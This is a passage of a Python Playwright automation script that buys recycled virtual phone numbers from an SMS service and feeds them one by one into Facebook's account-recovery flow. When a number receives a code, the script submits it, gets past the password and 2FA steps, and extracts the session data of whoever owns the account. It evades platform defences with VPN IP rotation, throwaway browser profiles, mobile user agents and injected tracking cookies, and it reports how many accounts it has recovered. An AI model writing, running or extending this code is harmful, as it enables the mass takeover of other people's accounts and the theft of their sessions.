            code_input = target.locator("input[name='n'], input[name='c'], #recovery_code_entry").first
            if code_input.is_visible(timeout=500):
                print("\n✅ Facebook went straight to the code entry screen!")
                return "success", target
        except Exception:
            pass
            
        time.sleep(2)
        
    print("⚠️ Timed out waiting for Facebook response.")
    return "error", target


def rotate_vpn_if_configured() -> None:
    vpn_name = getattr(CONFIG, 'vpn_connection_name', '')
    if not vpn_name:
        return
    try:
        import subprocess
        import time
        print(f"\n🔌 [VPN] Disconnecting Windows VPN connection '{vpn_name}'...")
        subprocess.run(f'rasdial "{vpn_name}" /disconnect', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        print(f"🔌 [VPN] Reconnecting Windows VPN connection '{vpn_name}' to rotate IP...")
        result = subprocess.run(f'rasdial "{vpn_name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ [VPN] VPN rotated and reconnected successfully!")
        else:
            print(f"⚠️ [VPN] VPN connection warning (Code {result.returncode}): {result.stderr or result.stdout}")
        time.sleep(5)
    except Exception as e:
        print(f"⚠️ [VPN] Error rotating VPN: {e}")


def main() -> None:
    session_start_time = time.time()
    try:
        with sync_playwright() as p:
            profile_name = getattr(CONFIG, 'chrome_profile_name', "Default")
            active_port = 9222
            browser, context, is_standalone = launch_and_connect_chrome(p, active_port, profile_name, user_data_subdir="chrome_profiles_hero")

            # Start session timers and counters
            session_start_time = time.time()
            accounts_recovered = 0
            total_numbers_tried = 0
            total_spent = 0.0
            session_stats = {"captcha_triggers": 0}
            
            # Calculate price per number from config
            price_match = re.search(r'\$?([0-9]+\.[0-9]+)', CONFIG.buy_text)
            price_per_sms = float(price_match.group(1)) if price_match else CONFIG.max_price

            print("\n" + "="*60)
            print("HERO SMS AUTOMATION - AUTOMATIC MODE")
            print("="*60)
            
            # Identify current Chrome profile dynamically
            print("\n🔍 Identifying Chrome profile...")
            active_profile_name = getattr(CONFIG, 'chrome_profile_name', "Unknown Profile")
            current_folder_name = profile_name  # Default fallback
            try:
                version_page = context.new_page()
                version_page.goto("chrome://version", wait_until="domcontentloaded", timeout=10000)
                profile_path = version_page.locator("#profile_path").inner_text(timeout=5000)
                import os
                import json
                
                # This gets the internal folder name (e.g. "Profile 16")
                folder_name = os.path.basename(profile_path.strip('\\/'))
                current_folder_name = folder_name
                active_profile_name = folder_name
                
                # Now we look at the parent directory's Local State file to find the user-facing name ("test15")
                parent_dir = os.path.dirname(profile_path.strip('\\/'))
                local_state_path = os.path.join(parent_dir, "Local State")
                
                if os.path.exists(local_state_path):
                    try:
                        with open(local_state_path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            human_name = data.get('profile', {}).get('info_cache', {}).get(folder_name, {}).get('name')
                            if human_name:
                                active_profile_name = human_name
                    except Exception:
                        pass
                
                version_page.close()
                print(f"✅ Active Profile Detected: {active_profile_name} (Internal: {folder_name})")
            except Exception as e:
                print(f"⚠️ Could not automatically identify Chrome profile: {e}")
                try:
                    version_page.close()
                except:
                    pass
            
            # Facebook session checks are strictly isolated to the recovery browser context

            # Skip auto-login - user logs in manually
            print("\n[OK] Make sure you are already logged into Hero SMS in Chrome")
            
            hero = find_or_open_page(context, CONFIG.hero_url)
            hero.bring_to_front()
            
            print("\n⏳ Verifying Hero SMS login status...")
            try:
                # Check for common login indicators
                login_btn = hero.locator("a:has-text('Login / Register'), button:has-text('Log in')").first
                login_title = hero.get_by_text(re.compile("Log in to your account", re.I)).first
                
                if login_btn.is_visible(timeout=3000) or login_title.is_visible(timeout=1000):
                    print("\n❌ You are NOT logged into Hero SMS!")
                    
                    # Check if auto_login is configured
                    if getattr(CONFIG, 'auto_login', False):
                        print("🤖 Auto-login is enabled. Running auto-login handler...")
                        try:
                            login_if_needed(context)
                        except Exception as ae:
                            print(f"⚠️ Auto-login handler encountered an error: {ae}")
                        
                    # Double-check status after auto-login handler run
                    if login_btn.is_visible(timeout=2000) or login_title.is_visible(timeout=1000):
                        if login_btn.is_visible():
                            print("🖱️ Auto-clicking 'Login / Register' to open the popup...")
                            try:
                                login_btn.click(timeout=2000)
                                time.sleep(1)
                            except Exception:
                                pass
                        
                        print("🛑 Auto-login could not complete (e.g. Cloudflare check needed). Please log in manually.")
                        print("⏳ The script will automatically resume once you are logged in and the 'Login / Register' button disappears...")
                        
                        # Wait for manual login fallback
                        if login_btn.is_visible():
                            login_btn.wait_for(state="hidden", timeout=300_000) # Wait up to 5 mins
                        else:
                            login_title.wait_for(state="hidden", timeout=300_000)
                            
                        print("\n✅ Login confirmed! Resuming automation...")
                        time.sleep(2) # Give the dashboard a moment to load
                    else:
                        print("\n✅ Auto-login verified! Resuming automation...")
                else:
                    print("✅ You are logged in!")
            except Exception as e:
                # Check login buttons again to be sure
                try:
                    if login_btn.is_visible(timeout=1000):
                        print(f"❌ Verification failed and login button is still visible: {e}")
                        raise e
                except:
                    pass
                print("✅ You are logged in!")
                
            print("\n🔍 Ensuring the 'Purchases' page is visible...")
            try:
                # Look for a navigation link to 'My purchases' or 'Purchases'
                purchases_btn = hero.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
                if purchases_btn.is_visible(timeout=2000):
                    purchases_btn.click()
                    time.sleep(2) # Give the table time to load
                    print("✅ Navigated to Purchases page.")
            except Exception:
                pass

            fb_browser = None
            fb_port = None
            fb_page = None
            fb_profile_name = None
            fb_context = None
            is_shared_fb_browser = False

            max_attempts = 20
            attempt = 0
            success = False
            is_looping = getattr(CONFIG, 'multiple_accounts', False)
            
            while (attempt < max_attempts or is_looping) and not success:
                # Verify if browser connection is still active and hero page is open
                try:
                    check_stop_flag()
                    if not browser.is_connected() or hero.is_closed():
                        print("\n⚠️ Browser connection lost or Hero SMS tab was closed! Re-establishing connection...")
                        try:
                            browser.close()
                        except:
                            pass
                        close_chrome_on_port(active_port)
                        time.sleep(1)
                        profile_name = getattr(CONFIG, 'chrome_profile_name', "Default")
                        browser, context, is_standalone = launch_and_connect_chrome(p, active_port, profile_name, user_data_subdir="chrome_profiles_hero")
                        hero = find_or_open_page(context, CONFIG.hero_url)
                        hero.bring_to_front()
                except Exception as conn_err:
                    print(f"\n⚠️ Connection verification failed: {conn_err}. Re-launching Chrome...")
                    try:
                        try:
                            browser.close()
                        except:
                            pass
                        close_chrome_on_port(active_port)
                        time.sleep(1)
                        profile_name = getattr(CONFIG, 'chrome_profile_name', "Default")
                        browser, context, is_standalone = launch_and_connect_chrome(p, active_port, profile_name, user_data_subdir="chrome_profiles_hero")
                        hero = find_or_open_page(context, CONFIG.hero_url)
                        hero.bring_to_front()
                    except Exception as relaunch_err:
                        print(f"❌ Failed to re-launch Chrome: {relaunch_err}. Waiting 10 seconds before retrying...")
                        time.sleep(10)
                        continue

                attempt += 1
                rotate_vpn_if_configured()
                check_for_ban(hero)
                print(f"\n{'='*60}")
                print(f"Attempt {attempt}/{max_attempts}")
                print(f"{'='*60}")
                
                try:
                    # 1. PROACTIVELY set up the Facebook Chrome profile & page FIRST before spending any money!
                    if not is_placeholder_url(CONFIG.target_url):
                        try:
                            # Launch a separate browser for recovery using a fresh profile directory
                            if not fb_browser or not fb_browser.is_connected():
                                fb_profile_name = generate_next_profile_name(force_new=True)
                                import socket
                                def get_free_port():
                                    p_check = 9223
                                    while True:
                                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                            try:
                                                s.bind(('127.0.0.1', p_check))
                                                return p_check
                                            except OSError:
                                                p_check += 1
                                fb_port = get_free_port()
                                
                                print(f"\n🔄 Spawning separate fresh Chrome profile '{fb_profile_name}' on port {fb_port} for Facebook recovery...")
                                fb_browser, fb_context, fb_is_standalone = launch_and_connect_chrome(p, fb_port, fb_profile_name, user_data_subdir="chrome_profiles_fb", is_guest=False, is_mobile=False)
                                # Inject mature Facebook tracking cookies from main context
                                try:
                                    main_cookies = context.cookies()
                                    fb_tracking_cookies = [
                                        c for c in main_cookies 
                                        if "facebook.com" in c.get("domain", "") and c.get("name") in ["datr", "sb", "wd"]
                                    ]
                                    if fb_tracking_cookies:
                                        fb_context.add_cookies(fb_tracking_cookies)
                                        print(f"✨ Injected {len(fb_tracking_cookies)} mature Facebook tracking cookies from Hero SMS context.")
                                except Exception as c_err:
                                    print(f"⚠️ Tracking cookie injection failed: {c_err}")
                            else:
                                print(f"\n🔄 Reusing running Chrome profile '{fb_profile_name}' for this attempt...")

                            fb_active_name = fb_profile_name
                            try:
                                local_state_path = os.path.join(get_official_chrome_user_data_dir(), "Local State")
                                if os.path.exists(local_state_path):
                                    with open(local_state_path, "r", encoding="utf-8") as f:
                                        state_data = json.load(f)
                                    h_name = state_data.get('profile', {}).get('info_cache', {}).get(fb_profile_name, {}).get('name')
                                    if h_name:
                                        fb_active_name = h_name
                            except:
                                pass

                            # Open a temporary target page to verify if we are logged in or blocked
                            # This verifies profile state WITHOUT submitting a phone number yet!
                            print("🔍 Verifying profile state before purchasing number...")
                            temp_page = fb_context.new_page()
                            temp_page.goto(CONFIG.target_url, wait_until="domcontentloaded")
                            
                            is_logged_in = False
                            try:
                                fb_cookies = fb_context.cookies("https://www.facebook.com")
                                if any(c['name'] == 'c_user' for c in fb_cookies):
                                    is_logged_in = True
                            except:
                                pass
                                
                            if is_logged_in:
                                print(f"⚠️ Profile '{fb_profile_name}' already contains an active Facebook session!")
                                try: temp_page.close()
                                except: pass
                                raise RuntimeError("Target profile is already logged in to Facebook. Skipping to preserve session.")
                            
                            try: temp_page.close()
                            except: pass
                        except Exception as setup_err:
                            print(f"\n❌ Error during Facebook profile verification: {setup_err}")
                            if fb_browser:
                                try: fb_browser.close()
                                except: pass
                            if fb_port:
                                try: close_chrome_on_port(fb_port)
                                except: pass
                            
                            fb_browser = None
                            fb_page = None
                            fb_context = None
                            fb_port = None
                            fb_profile_name = None
                            
                            print("🔄 Retrying with a new profile index in next attempt...")
                            attempt += 1
                            continue

                    # 2. Now that the profile is confirmed clean and ready, proceed to buy a number!
                    # Navigate to Purchases page to note the current top number before buying
                    navigate_to_purchases(hero)
                    top_before = get_top_number(hero)
                    
                    # Navigate to Get code page
                    if not navigate_to_get_code(hero):
                        print("🔴 Aborting this attempt because we could not navigate to Get code page.")
                        time.sleep(3)
                        continue
                    
                    # Ensure service and country are selected (in case of page refresh)
                    selection_success = select_service_and_country(hero)
                    if not selection_success:
                        print("🔴 Aborting this attempt because service/country could not be selected.")
                        time.sleep(3)
                        continue
                    
                    # Dynamically determine valid buy button candidate texts to search
                    buy_candidates = []
                    configured_text = CONFIG.buy_text
                    if configured_text:
                        buy_candidates.append(configured_text)
                    buy_candidates.extend(["Buy for", "Buy"])
                    
                    min_price_config = CONFIG.min_price
                    max_price_config = CONFIG.max_price
                    
                    print(f"\n🛒 Locating buy button candidates within range ${min_price_config:.3f} - ${max_price_config:.3f}: {buy_candidates}...")
                    # Give the page a tiny bit of time to settle before clicking buy, 
                    # especially if we just selected the country
                    time.sleep(1) 
                    
                    purchase_success = False
                    api_activation_id = None
                    api_phone_number = None
                    # ---- API MODE: get the number straight from the provider's API ----
                    if CONFIG.use_api:
                        api_activation_id, api_phone_number = api_get_number()
                        if not api_phone_number:
                            print("🔴 [API] No number available. Retrying in 8s...")
                            time.sleep(8)
                            continue
                        purchase_success = True  # skip the website buy flow entirely

                    for buy_attempt in range(1, 11):
                        if CONFIG.use_api:
                            break  # number already obtained via API
                        check_for_ban(hero)
                        buy_clicked = False
                        price_out_of_bounds = False
                        click_err = None
                        close_cookies_if_needed(hero)
                        if check_and_recover_server_error(hero):
                            print("🔄 Re-selecting service and country after server error recovery...")
                            select_service_and_country(hero)
                        
                        # 1. Scan ALL buy buttons and pick the FIRST one whose price
                        #    is within the acceptable range — not just the first button
                        #    on the page (which may be pricier than others available).
                        try:
                            all_buy = hero.locator(
                                "button:has-text('Buy'), a:has-text('Buy'), "
                                "div[role='button']:has-text('Buy'), .v-btn:has-text('Buy')"
                            )
                            n_buy = all_buy.count()
                        except Exception:
                            n_buy = 0

                        chosen_btn = None
                        chosen_price = 0.0
                        prices_seen = []
                        for i in range(min(n_buy, 50)):
                            try:
                                cand_btn = all_buy.nth(i)
                                if not cand_btn.is_visible(timeout=400):
                                    continue
                                ok, pr = check_price_range(cand_btn, min_price_config, max_price_config)
                                if pr > 0:
                                    prices_seen.append(pr)
                                    if ok:  # a real, parsed price within range
                                        chosen_btn = cand_btn
                                        chosen_price = pr
                                        break
                            except Exception:
                                continue

                        if chosen_btn is not None:
                            if chosen_price > 0:
                                price_per_sms = chosen_price
                            print(f"🎯 Buying a number at ${chosen_price:.3f} (within ${min_price_config:.3f} - ${max_price_config:.3f}) (attempt {buy_attempt}/10)...")
                            try:
                                chosen_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
                                time.sleep(0.2)
                            except Exception:
                                pass
                            try:
                                chosen_btn.click(timeout=3000)
                            except Exception:
                                try:
                                    chosen_btn.click(timeout=3000, force=True)
                                except Exception:
                                    chosen_btn.evaluate("el => el.click()")
                            try:
                                hero.wait_for_load_state("domcontentloaded", timeout=2000)
                            except Exception:
                                pass
                            buy_clicked = True
                        elif prices_seen:
                            cheapest = min(prices_seen)
                            print(f"🛑 All {len(prices_seen)} available number(s) are OUTSIDE your price range "
                                  f"(${min_price_config:.3f} - ${max_price_config:.3f} USD). Cheapest available is ${cheapest:.3f}. "
                                  f"Raise 'Max Price' above ${cheapest:.3f} to buy.")
                            price_out_of_bounds = True

                        if price_out_of_bounds:
                            print("⏳ No number within your price range right now. Retrying in 10 seconds...")
                            time.sleep(10)
                            break
                                
                        # 2. Fallback to regex-based Buy button locator if candidate texts didn't hit
                        if not buy_clicked:
                            try:
                                regex_btn = hero.get_by_role("button", name=re.compile(r"buy", re.I)).first
                                if not regex_btn.is_visible(timeout=1000):
                                    regex_btn = hero.locator("button, a, div[role='button'], .v-btn").filter(has_text=re.compile(r"buy", re.I)).first
                                    
                                if regex_btn.is_visible(timeout=1500):
                                    # Verify price range
                                    price_ok, parsed_price = check_price_range(regex_btn, min_price_config, max_price_config)
                                    if not price_ok:
                                        print(f"🛑 Skipping regex purchase because price {parsed_price:.3f} USD is outside acceptable range (${min_price_config:.3f} - ${max_price_config:.3f} USD).")
                                        price_out_of_bounds = True
                                        break
                                        
                                    if parsed_price > 0:
                                        price_per_sms = parsed_price
                                        
                                    print(f"🎯 Found visible regex buy button (Price: {price_per_sms:.3f} USD). Clicking it (attempt {buy_attempt}/10)...")
                                    try:
                                        regex_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
                                        time.sleep(0.2)
                                    except Exception:
                                        pass
                                    try:
                                        regex_btn.click(timeout=3000)
                                    except Exception:
                                        try:
                                            regex_btn.click(timeout=3000, force=True)
                                        except Exception:
                                            regex_btn.evaluate("el => el.click()")
                                    buy_clicked = True
                            except Exception as e:
                                click_err = e

                        if price_out_of_bounds:
                            print("⏳ Price limit block hit. Retrying country/service selection in 10 seconds...")
                            time.sleep(10)
                            break

                        # 3. Fallback to generic click_visible_text
                        if not buy_clicked:
                            for cand in buy_candidates:
                                try:
                                    print(f"⚠️ Direct candidate locator failed. Trying click_visible_text for: '{cand}'...")
                                    click_visible_text(hero, cand, timeout_ms=4000)
                                    buy_clicked = True
                                    break
                                except Exception as err:
                                    click_err = err
                                
                        if not buy_clicked:
                            print(f"❌ Error clicking BUY button: {click_err}")
                            print("🔍 Checking if we were logged out from Hero SMS...")
                            
                            login_btn = hero.locator("a:has-text('Login / Register'), button:has-text('Log in')").first
                            login_title = hero.get_by_text(re.compile("Log in to your account", re.I)).first
                            
                            if login_btn.is_visible(timeout=2000) or login_title.is_visible(timeout=1000):
                                print("⚠️ Session logout detected! Attempting re-login...")
                                if getattr(CONFIG, 'auto_login', False):
                                    try:
                                        login_if_needed(context)
                                    except Exception as ae:
                                        print(f"⚠️ Re-login auto-login handler failed: {ae}")
                                        
                                if login_btn.is_visible(timeout=2000) or login_title.is_visible(timeout=1000):
                                    if login_btn.is_visible():
                                        try:
                                            login_btn.click(timeout=2000)
                                        except:
                                            pass
                                    print("🛑 Please log in manually in the Chrome window.")
                                    if login_btn.is_visible():
                                        login_btn.wait_for(state="hidden", timeout=300_000)
                                    else:
                                        login_title.wait_for(state="hidden", timeout=300_000)
                                    print("✅ Re-login confirmed!")
                                    
                                # Re-navigate and re-select
                                navigate_to_get_code(hero)
                                select_service_and_country(hero)
                                
                                print("🔄 Retrying BUY button click after re-login...")
                                close_cookies_if_needed(hero)
                                click_visible_text(hero, CONFIG.buy_text, timeout_ms=10000)
                                buy_clicked = True
                            else:
                                pass # Keep looping to retry next attempt
                            
                        print("⏳ Checking purchase status popup...")
                        purchase_failed = False
                        try:
                            success_toast = hero.get_by_text(re.compile("Numbers purchased successfully", re.I)).first
                            fail_toast = hero.get_by_text(re.compile("no number", re.I)).first
                            
                            for _ in range(10): # Check for up to 5 seconds
                                check_for_ban(hero)
                                if success_toast.is_visible():
                                    print("✅ Purchase confirmed by system popup!")
                                    purchase_success = True
                                    break
                                if fail_toast.is_visible():
                                    print("⚠️ System popup: No numbers available!")
                                    purchase_failed = True
                                    break
                                time.sleep(0.5)
                        except KeyboardInterrupt:
                            raise
                        except Exception:
                            pass
                            
                        # Fallback validation: Even if the system toast popup was missed or didn't render,
                        # we immediately verify by checking if a new number was successfully added to Purchases list.
                        if not purchase_success and not purchase_failed:
                            try:
                                print("🔍 No popup toast detected. Waiting 3 seconds for server purchase processing...")
                                time.sleep(3.0)
                                print("🔍 Verifying purchase directly from Purchases history...")
                                temp_page = hero.context.new_page()
                                try:
                                    temp_page.goto(CONFIG.purchased_url or "https://hero-sms.com/purchases/numbers", wait_until="domcontentloaded", timeout=8000)
                                    # Wait a tiny bit for the table AJAX to render on the new page
                                    time.sleep(1.5)
                                    current_top = get_top_number(temp_page)
                                    if current_top and current_top != top_before:
                                        print(f"✅ Direct Verification Success! Found new active number in history: {current_top}")
                                        purchase_success = True
                                except Exception as direct_check_err:
                                    pass
                                finally:
                                    temp_page.close()
                            except:
                                pass
                                
                        if purchase_success:
                            break
                            
                        if purchase_failed:
                            print("Waiting 2 seconds before re-clicking the Buy button...")
                            time.sleep(2)
                            close_cookies_if_needed(hero)
                            continue
                            
                    if not purchase_success:
                        print("❌ Failed to purchase a number after 10 consecutive clicks. Restarting attempt loop...")
                        time.sleep(5)
                        continue

                    if CONFIG.use_api:
                        # API mode: we already have the number, no website table to read
                        phone_number = api_phone_number
                    else:
                        # Navigate to Purchases page to view the new number
                        navigate_to_purchases(hero)
                        print("\n📱 Extracting phone number from purchases table...")
                        phone_number = extract_phone_number(hero, CONFIG.purchased_number_selector, top_before)

                    try:
                        pyperclip.copy(phone_number)
                    except Exception:
                        pass
                    print(f"✅ Number ready: {phone_number}")

                    if not is_placeholder_url(CONFIG.target_url):
                        total_numbers_tried += 1
                        
                        try:
                            # Retry the SAME phone number across fresh Chrome profiles if rate limited
                            max_profile_retries = 3
                            flagged_profiles = set()
                            for profile_retry in range(max_profile_retries):
                                # Ensure a valid Chrome profile is running
                                if not fb_browser or not fb_browser.is_connected():
                                    fb_profile_name = generate_next_profile_name(exclude=flagged_profiles, force_new=True)
                                    import socket
                                    def get_free_port():
                                        p_check = 9223
                                        while True:
                                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                                try:
                                                    s.bind(('127.0.0.1', p_check))
                                                    return p_check
                                                except OSError:
                                                    p_check += 1
                                    fb_port = get_free_port()
                                    use_mobile_agent = (profile_retry > 0)
                                    print(f"\n🔄 Spawning fresh Chrome profile '{fb_profile_name}' on port {fb_port} for Facebook recovery (Mobile agent: {use_mobile_agent})...")
                                    fb_browser, fb_context, fb_is_standalone = launch_and_connect_chrome(p, fb_port, fb_profile_name, user_data_subdir="chrome_profiles_fb", is_guest=False, is_mobile=use_mobile_agent)
                                    # Inject mature Facebook tracking cookies from main context
                                    try:
                                        main_cookies = context.cookies()
                                        fb_tracking_cookies = [
                                            c for c in main_cookies 
                                            if "facebook.com" in c.get("domain", "") and c.get("name") in ["datr", "sb", "wd"]
                                        ]
                                        if fb_tracking_cookies:
                                            fb_context.add_cookies(fb_tracking_cookies)
                                            print(f"✨ Injected {len(fb_tracking_cookies)} mature Facebook tracking cookies from Hero SMS context.")
                                    except Exception as c_err:
                                        print(f"⚠️ Tracking cookie injection failed: {c_err}")
                                
                                print(f"\n📝 Filling target page with phone number {phone_number} (Attempt {profile_retry + 1}/{max_profile_retries})...")
                                result, fb_page = fill_target_page(fb_context, phone_number)
                                
                                if result == "rate_limited":
                                    print(f"\n🛑 Facebook Rate-Limit Blocked profile '{fb_profile_name}'!")
                                    print(f"🧹 Deleting flagged profile directory '{fb_profile_name}' and spawning a NEW profile...")
                                    flagged_profiles.add(fb_profile_name)
                                    try: fb_page.close()
                                    except: pass
                                    try: fb_browser.close()
                                    except: pass
                                    if fb_port:
                                        close_chrome_on_port(fb_port)
                                    
                                    # Delete flagged profile directory from disk (not needed for guest profiles)
                                    if fb_profile_name != "Guest":
                                        flagged_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb", fb_profile_name)
                                        if os.path.exists(flagged_dir):
                                            try:
                                                time.sleep(1)
                                                shutil.rmtree(flagged_dir, ignore_errors=True)
                                                print(f"🗑️ Cleaned flagged profile folder '{fb_profile_name}' from disk.")
                                            except Exception as del_err:
                                                pass
                                    
                                    fb_browser = None
                                    fb_page = None
                                    fb_context = None
                                    fb_port = None
                                    fb_profile_name = None
                                    
                                    print("⏳ Waiting 10 seconds and rotating IP if configured...")
                                    time.sleep(10)
                                    rotate_vpn_if_configured()
                                    continue  # Retry with a new profile on the SAME number!
                                else:
                                    break # Exit profile retry loop on success or not_found
                            
                            if result == "success" and fb_page:
                                print("\n✅ SUCCESS! Account found and recovery in progress!")
                                print("\n🔄 Checking Hero SMS tab to wait for code...")
                                try:
                                    if hero.is_closed():
                                        hero = find_or_open_page(context, CONFIG.hero_url)
                                    hero.bring_to_front()
                                except Exception as btf_err:
                                    print(f"⚠️ Could not bring Hero tab to front: {btf_err}")
                                
                                try:
                                    if CONFIG.use_api:
                                        print("🌐 [API] Waiting for the OTP from the provider API...")
                                        sms_code = api_get_code(api_activation_id, timeout_sec=180)
                                    else:
                                        sms_code = wait_for_sms_code(hero, phone_number=phone_number, fb_page=fb_page, timeout_sec=180, session_stats=session_stats)
                                    total_spent += price_per_sms
                                    update_daily_stats(spent=price_per_sms)
                                    
                                    print("\n🔄 Switching back to Facebook page to enter code...")
                                    try:
                                        if fb_page and not fb_page.is_closed():
                                            fb_page.bring_to_front()
                                    except Exception:
                                        pass
                                    
                                    submit_success = submit_facebook_code(fb_page, sms_code)
                                    if submit_success:
                                        print("\n🎉 CODE SUBMITTED SUCCESSFULLY! 🎉")
                                        pwd_status, password_used = handle_post_verification(fb_context, fb_page)
                                        if pwd_status in ["success", "2fa"]:
                                            two_fa_str = "2FA" if pwd_status == "2fa" else ""
                                            extract_session_data(fb_context, fb_page, phone_number, password_used, fb_active_name, two_fa=two_fa_str)
                                            accounts_recovered += 1
                                            update_daily_stats(recovered=1)
                                            
                                            print("\n" + "="*60)
                                            if pwd_status == "2fa":
                                                print(f"✅ SUCCESS (2FA)! Recovered Account #{accounts_recovered} in '{fb_active_name}'")
                                            else:
                                                print(f"✅ SUCCESS! Recovered Account #{accounts_recovered} in '{fb_active_name}'")
                                            print("="*60)
                                            
                                            # Clean up Facebook page and browser cleanly
                                            try: fb_page.close()
                                            except: pass
                                            try: fb_browser.close()
                                            except: pass
                                            if fb_port:
                                                close_chrome_on_port(fb_port)
                                            time.sleep(1.5)
                                            if fb_profile_name != "Guest":
                                                sync_profile_to_official(fb_profile_name)
                                            
                                            # Reset profile context variables so the next run spawns a new profile
                                            fb_browser = None
                                            fb_page = None
                                            fb_context = None
                                            fb_port = None
                                            fb_profile_name = None
                                            
                                            if getattr(CONFIG, 'multiple_accounts', False):
                                                # Reset loop variables to continue on stable Hero tab
                                                attempt = 0
                                                continue
                                            else:
                                                # Also close the main Hero SMS browser cleanly if we are exiting the script
                                                if is_standalone:
                                                    try: browser.close()
                                                    except: pass
                                                    close_chrome_on_port(active_port)
                                                success = True
                                                break
                                        else:
                                            print(f"\n❌ Post-verification failed (Status: {pwd_status}). Moving to next number...")
                                            update_daily_stats(failed_logins=1)
                                            delete_failed_number(hero)
                                            time.sleep(2)
                                    else:
                                        print("\n❌ Failed to submit code on Facebook.")
                                        update_daily_stats(failed_logins=1)
                                        delete_failed_number(hero)
                                        time.sleep(2)
                                except ValueError as ve:
                                    if str(ve) == "sms_blocked_by_facebook":
                                        print("\n❌ Facebook is blocking SMS delivery to this number ('We can't send SMS to this mobile number').")
                                        print("Deleting number and retrying with a new virtual number...")
                                        delete_failed_number(hero)
                                        time.sleep(2)
                                    else:
                                        raise ve
                                except RuntimeError as e:
                                    print(f"\n❌ {e}")
                                    delete_failed_number(hero)
                                    time.sleep(2)
                            elif result == "rate_limited":
                                print(f"\n🛑 Number {phone_number} reached max profile retries on rate limits.")
                                delete_failed_number(hero)
                                time.sleep(2)
                            elif result == "not_found":
                                print("\n❌ No account found with this number.")
                                print("Deleting this number and trying another...")
                                delete_failed_number(hero)
                                print("\n🔄 Looping to buy another number...")
                                time.sleep(2)
                            else:
                                print(f"\n❌ Failed to load target recovery form: {result}")
                                print("Deleting this number and trying another...")
                                delete_failed_number(hero)
                                print("\n🔄 Looping to buy another number...")
                                time.sleep(2)
                        except Exception as setup_err:
                            print(f"\n❌ Error during Facebook recovery setup: {setup_err}")
                            if fb_page:
                                try: fb_page.close()
                                except: pass
                            if fb_browser:
                                try: fb_browser.close()
                                except: pass
                            if fb_port:
                                try: close_chrome_on_port(fb_port)
                                except: pass
                            
                            # Reset profile variables so a brand new profile is chosen on the next loop iteration
                            fb_browser = None
                            fb_page = None
                            fb_context = None
                            fb_port = None
                            fb_profile_name = None
                            
                            # CRITICAL: Always delete the number we just bought so it doesn't stay active and waste money!
                            print("🧹 Cleaning up: Deleting active purchased number to prevent wasted credits...")
                            try:
                                delete_failed_number(hero)
                            except Exception as delete_err:
                                print(f"⚠️ Error deleting failed number during cleanup: {delete_err}")
                            time.sleep(2)
                            
                            # Log error and continue to the next loop iteration
                            print("🔄 Retrying setup in next attempt...")
                            attempt += 1
                            continue
                except KeyboardInterrupt:
                    print("\n⚠️ Process stopped gracefully by user.")
                    break
                except Exception as e:
                    print(f"\n❌ Error: {e}")
                    if attempt < max_attempts:
                        print(f"Retrying... (attempt {attempt + 1}/{max_attempts})")
            
            session_end_time = time.time()
            elapsed_seconds = int(session_end_time - session_start_time)
            # update_daily_stats(duration=elapsed_seconds) (Handled by app.py to prevent double-counting)
            elapsed_mins = elapsed_seconds // 60
            elapsed_secs_remainder = elapsed_seconds % 60
            
            if success or accounts_recovered > 0:
                print("\n" + "="*60)
                print("✅ AUTOMATION SESSION COMPLETED!")
            else:
                print("\n" + "="*60)
                print("❌ PROCESS FAILED AFTER MAX ATTEMPTS")
                
            print("="*60)
            print(f"⏱️  Total Time Elapsed : {elapsed_mins} minutes, {elapsed_secs_remainder} seconds")
            print(f"🎉 Total Accounts Recovered: {accounts_recovered}")
            print(f"📱 Total Numbers Tried     : {total_numbers_tried}")
            if total_numbers_tried > 0:
                success_rate = (accounts_recovered / total_numbers_tried) * 100
                print(f"📈 Overall Success Rate    : {success_rate:.1f}%")
            print(f"🤖 CAPTCHAs Encountered   : {session_stats.get('captcha_triggers', 0)}")
            if total_numbers_tried > 0:
                captcha_rate = (session_stats.get('captcha_triggers', 0) / total_numbers_tried) * 100
                print(f"📊 CAPTCHA Rate per Number : {captcha_rate:.1f}%")
            print(f"💰 Total Amount Spent      : ${total_spent:.3f}")
            print("="*60)
            
    except KeyboardInterrupt:
        try:
            session_end_time = time.time()
            elapsed_seconds = int(session_end_time - session_start_time)
            elapsed_mins = elapsed_seconds // 60
            elapsed_secs_remainder = elapsed_seconds % 60
            print("\n" + "="*60)
            print("⚠️ AUTOMATION PROCESS STOPPED BY USER")
            print("="*60)
            print(f"⏱️  Total Time Elapsed : {elapsed_mins} minutes, {elapsed_secs_remainder} seconds")
            print(f"🎉 Total Accounts Recovered: {accounts_recovered}")
            print(f"📱 Total Numbers Tried     : {total_numbers_tried}")
            if total_numbers_tried > 0:
                success_rate = (accounts_recovered / total_numbers_tried) * 100
                print(f"📈 Overall Success Rate    : {success_rate:.1f}%")
            print(f"🤖 CAPTCHAs Encountered   : {session_stats.get('captcha_triggers', 0)}")
            if total_numbers_tried > 0:
                captcha_rate = (session_stats.get('captcha_triggers', 0) / total_numbers_tried) * 100
                print(f"📊 CAPTCHA Rate per Number : {captcha_rate:.1f}%")
            print(f"💰 Total Amount Spent      : ${total_spent:.3f}")
            print("="*60)
        except Exception as se:
            print(f"⚠️ Error printing session summary on stop: {se}")
    except Exception as e:
        print(f"\n❌ High-level runner error: {e}")


if __name__ == "__main__":
    main()
